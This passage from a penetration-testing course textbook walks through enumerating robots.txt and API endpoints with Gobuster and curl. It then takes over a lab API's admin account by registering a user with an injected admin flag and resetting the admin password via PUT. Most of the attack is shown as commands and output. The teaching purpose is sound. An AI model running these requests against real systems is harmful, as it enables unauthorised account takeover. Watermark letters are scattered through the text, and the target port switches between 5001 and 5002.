352 (Mozilla, 2022), https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For
353 (IETF, 2012), https://www.rfc-editor.org/rfc/rfc6648
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 224
Made in Morocco
Penetration Testing with Kali Linux
additional information, such as that the “x-amz-cf-id” header indicates the application uses
Amazon CloudFront.354
Sitemaps are another important element we should take into consideration when enumerating
web applications.
Web applications can include sitemap files to help search engine bots crawl and index their sites.
These files also include directives of which URLs not to crawl - typically sensitive pages or
administrative consoles, which are exactly the sort of pages we are interested in.
Inclusive directives are performed with the sitemaps355 protocol, while robots.txt excludes URLs
from being crawled.
For example, we can retrieve the robots.txt file from www.google.com with curl:
y
kali@kali:~$ curl https://www.google.com/robots.txt
User-agent: *
Disallow: /search
k
Allow: /search/about
Allow: /search/static
Allow: /search/howsearchworks s
Disallow: /sdch
Disallow: /groups
o
Disallow: /index.html?
Disallow: /?
Allow: /?hl=
n
...
Listing 104 - https://www.google.com/robots.txt
i
Allow and Disallow are directives for web crawlers indicating pages or directories that “polite” web
z
crawlers may or may not access, respectively. In most cases, the listed pages and directories
may not be interesting, and some may even be invalid. Nevertheless, sitemap files should not be
overlooked because they Dmay contain clues about the website layout or other interesting
information, such as yet-unexplored portions of the target.
8.3.3 Enumerating and Abusing APIs
In many cases, our penetration test target is an internally-built, closed-source web application that
is shipped with a number of Application Programming Interfaces (API). These APIs are
responsible for interacting with the back-end logic and providing a solid backbone of functions to
the web application.
A specific type of API named Representational State Transfer (REST) is used for a variety of
purposes, including authentication.
In a typical white-box test scenario, we would receive complete API documentation to help us
fully map the attack surface. However, when performing a black-box test, we’ll need to discover
the target’s API ourselves.
354 (Amazon Web Services, Inc. 2022),
https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/RequestAndResponseBehaviorCustomOrigin.html#request
-custom-headers-behavior
355 (Sitemaps.org, 2022), https://www.sitemaps.org/
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 225
Made in Morocco
Penetration Testing with Kali Linux
We can use Gobuster features to brute force the API endpoints. In this test scenario, our API
gateway web server is listening on port 5001 on 192.168.50.16, so we can attempt a directory
brute force attack.
API paths are often followed by a version number, resulting in a pattern such as:
/api_name/v1
Listing 105 - API Path Naming Convention
The API name is often quite descriptive about the feature or data it uses to operate, followed
directly by the version number.
With this information, let’s try brute forcing the API paths using a wordlist along with the pattern
Gobuster feature. We can call this feature by using the -p option and providing a file with patterns.
For our test, we’ll create a simple pattern file on our Kali system containing the following text:
y
{GOBUSTER}/v1
{GOBUSTER}/v2
k
Listing 106 - Gobuster pattern
In this example, we are using the “{GOBUSTER}” placehoslder to match any word from our wordlist,
which will be appended with the version number. To keep our test simple, we’ll try with only two
versions.
o
We are now ready to enumerate the API with gobuster using the following command:
n
kali@kali:~$ gobuster dir -u http://192.168.50.16:5002 -w
/usr/share/wordlists/dirb/big.txt -p pattern
================================i===============================
Gobuster v3.1.0
z
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url: D http://192.168.50.16:5001
[+] Method: GET
[+] Threads: 10
[+] Wordlist: /usr/share/wordlists/dirb/big.txt
[+] Patterns: pattern (1 entries)
[+] Negative Status codes: 404
[+] User Agent: gobuster/3.1.0
[+] Timeout: 10s
===============================================================
2022/04/06 04:19:46 Starting gobuster in directory enumeration mode
===============================================================
/books/v1 (Status: 200) [Size: 235]
/console (Status: 200) [Size: 1985]
/ui (Status: 308) [Size: 265] [--> http://192.168.50.16:5001/ui/]
/users/v1 (Status: 200) [Size: 241]
Listing 107 - Bruteforcing API Paths
We discovered multiple hits, including two interesting entries that seem to be API endpoints,
/books/v1 and /users/v1.
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 226
Made in Morocco
Penetration Testing with Kali Linux
If we browse to the /ui path we’ll discover the entire APIs’ documentation.
Although this is common during white-box testing, is not a luxury we normally
have during a black-box test.
Let’s first inspect the /users API with curl.
kali@kali:~$ curl -i http://192.168.50.16:5002/users/v1
HTTP/1.0 200 OK
Content-Type: application/json
Content-Length: 241
Server: Werkzeug/1.0.1 Python/3.7.13
Date: Wed, 06 Apr 2022 09:27:50 GMT
y
{
"users": [
{ k
"email": "PI:EMAIL",
"username": "name1"
s
},
{
"email": "PI:EMAIL", o
"username": "name2"
},
{ n
"email": "PI:EMAIL",
"username": "admin"
} i
] z
}
Listing 108 - Obtaining Users’ Information
D
The application returned three user accounts, including an administrative account that seems to
be worth further investigation. We can use this information to attempt another brute force attack
with gobuster, this time targeting the admin user with a smaller wordlist. To verify if any further
API property is related to the username property, we’ll expand the API path by inserting the admin
username at the very end.
kali@kali:~$ gobuster dir -u http://192.168.50.16:5002/users/v1/admin/ -w
/usr/share/wordlists/dirb/small.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url: http://192.168.50.16:5001/users/v1/admin/
[+] Method: GET
[+] Threads: 10
[+] Wordlist: /usr/share/wordlists/dirb/small.txt
[+] Negative Status codes: 404
[+] User Agent: gobuster/3.1.0
[+] Timeout: 10s
===============================================================
2022/04/06 06:40:12 Starting gobuster in directory enumeration mode
===============================================================
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 227
Made in Morocco
Penetration Testing with Kali Linux
/email (Status: 405) [Size: 142]
/password (Status: 405) [Size: 142]
===============================================================
2022/04/06 06:40:35 Finished
===============================================================
Listing 109 - Discovering extra APIs
The password API path seems enticing for our testing purposes, so we’ll probe it via curl.
kali@kali:~$ curl -i http://192.168.50.16:5002/users/v1/admin/password
HTTP/1.0 405 METHOD NOT ALLOWED
Content-Type: application/problem+json
Content-Length: 142
Server: Werkzeug/1.0.1 Python/3.7.13
Date: Wed, 06 Apr 2022 10:58:51 GMT
y
{
"detail": "The method is not allowed for the requestedk URL.",
"status": 405,
"title": "Method Not Allowed",
s
"type": "about:blank"
}
Listing 110 - Discovering APoI unsupported methods
Interestingly, instead of a 404 Not Found response code, we received a 405 METHOD NOT
ALLOWED, implying that the requested URLn is present, but that our HTTP method is unsupported.
By default, curl uses the GET method when it performs requests, so we could try interacting with
the password API through a different method, such as POST or PUT.
i
Both POST and PUT methods, if pzermitted on this specific API, could allow us to override the user
credentials (in this case, the administrator password).
D
Before attempting a different method, let’s verify whether or not the overwritten credentials are
accepted. We can check if the login method is supported by extending our base URL as follows:
kali@kali:~$ curl -i http://192.168.50.16:5002/users/v1/login
HTTP/1.0 404 NOT FOUND
Content-Type: application/json
Content-Length: 48
Server: Werkzeug/1.0.1 Python/3.7.13
Date: Wed, 06 Apr 2022 12:04:30 GMT
{ "status": "fail", "message": "User not found"}
Listing 111 - Inspecting the ‘login’ API
Although we were presented with a 404 NOT FOUND message, the status message states that
the user has not been found; another clear sign that the API itself exists. We only need to find a
proper way to interact with it.
We know one of the usernames is admin, so we can attempt a login with this username and a
dummy password to verify that our strategy makes sense.
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 228
Made in Morocco
Penetration Testing with Kali Linux
Next, we will try to convert the above GET request into a POST and provide our payload in the
required JSON356 format. Let’s craft our request by first passing the admin username and dummy
password as JSON data via the -d parameter. We’ll also specify “json” as the “Content-Type” by
specifying a new header with -H.
kali@kali:~$ curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type:
application/json' http://192.168.50.16:5002/users/v1/login
{ "status": "fail", "message": "Password is not correct for the given username."}
Listing 112 - Crafting a POST request against the login API
The API return message shows that the authentication failed, meaning that the API parameters
are correctly formed.
Since we don’t know admin’s password, let’s try another route and check whether we can register
as a new user. This might lead to a different attack surface.
y
Let’s try registering a new user with the following syntax by adding a JSON data structure that
specifies the desired username and password: k
kali@kali:~$curl -d '{"password":"lab","username":"offsecadmin"}' -H 'Content-Type:
application/json' http://192.168.50.16:5002/userss/v1/register
{ "status": "fail", "message": "'email' is a required property"}
o
Listing 113 - Attempting new User Registration
The API replied with a fail message stating that we should also include an email address. We
n
could take this opportunity to determine if there’s any administrative key we can abuse. Let’s add
the admin key, followed by a True value.
i
kali@kali:~$curl -d z
'{"password":"lab","username":"offsec","email":"PI:EMAIL","admin":"True"}' -H
'Content-Type: application/json' http://192.168.50.16:5002/users/v1/register
{"message": "SuccessfullyD registered. Login to receive an auth token.", "status":
"success"}
Listing 114 - Attempting to register a new user as admin
Since we received no error, it seems we were able to successfully register a new user as an
admin, which should not be permitted by design. Next, let’s try to log in with the credentials we
just created by invoking the login API we discovered earlier.
kali@kali:~$curl -d '{"password":"lab","username":"offsec"}' -H 'Content-Type:
application/json' http://192.168.50.16:5002/users/v1/login
{"auth_token":
"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwi
c3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew", "message":
"Successfully logged in.", "status": "success"}
Listing 115 - Logging in as an admin user
356 (Mozilla, 2022), https://developer.mozilla.org/en-US/docs/Learn/JavaScript/Objects/JSON
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 229
Made in Morocco
Penetration Testing with Kali Linux
We were able to correctly sign in and retrieve a JWT357 authentication token. To obtain tangible
proof that we are an administrative user, we should use this token to change the admin user
password.
We can attempt this by forging a POST request that targets the password API.
kali@kali:~$ curl \
'http://192.168.50.16:5002/users/v1/admin/password' \
-H 'Content-Type: application/json' \
-H 'Authorization: OAuth
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic
3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew' \
-d '{"password": "pwned"}'
{
"detail": "The method is not allowed for the requested URL.y",
"status": 405,
"title": "Method Not Allowed",
k
"type": "about:blank"
}
Listing 116 - Attempting to Change the Administratsor Password via a POST request
We passed the JWT key inside the Authorization header along with the new password.
o
Sadly, the application states that the method used is incorrect, so we need to try another one. The
PUT method (along with PATCH) is often used to replace a value as opposed to creating one via a
n
POST request, so let’s try to explicitly define it next:
kali@kali:~$ curl -X 'PUT' \
i
'http://192.168.50.16:5002/users/v1/admin/password' \
z
-H 'Content-Type: application/json' \
-H 'Authorization: OAuth
eyJ0eXAiOiJKV1QiLCJhbGciODiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic
3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4' \
-d '{"password": "pwned"}'
Listing 117 - Attempting to Change the Administrator Password via a PUT request
This time we received no error message, so we can assume that no error was thrown by the
application backend logic. To prove that our attack succeeded, we can try logging in as admin
using the newly-changed password.
kali@kali:~$ curl -d '{"password":"pwned","username":"admin"}' -H 'Content-Type:
application/json' http://192.168.50.16:5002/users/v1/login
{"auth_token":
"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzIxMjgsImlhdCI6MTY0OTI3MTgyOCwi
c3ViIjoiYWRtaW4ifQ.yNgxeIUH0XLElK95TCU88lQSLP6lCl7usZYoZDlUlo0", "message":
"Successfully logged in.", "status": "success"}
Listing 118 - Successfully logging in as the admin account
Nice! We managed to take over the admin account by exploiting a logical privilege escalation bug
present in the registration API.